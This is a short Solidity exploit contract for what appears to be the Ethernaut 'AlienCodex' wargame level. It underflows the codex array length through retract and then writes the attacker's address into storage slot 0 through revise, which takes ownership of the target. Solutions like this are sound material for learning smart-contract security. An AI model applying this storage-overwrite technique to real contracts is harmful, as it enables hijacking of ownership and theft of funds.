// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IAlienCodex} from "./interface/IAlienCodex.sol";

contract Attack {
    IAlienCodex private immutable _TARGET;

    constructor(address target) {
        _TARGET = IAlienCodex(target);
    }

    function exploit(address exploiter) public payable {
        _TARGET.makeContact();
        _TARGET.retract();
        _TARGET.revise(
            (type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1),
            bytes32(uint256(uint160(exploiter)))
        );
    }
}
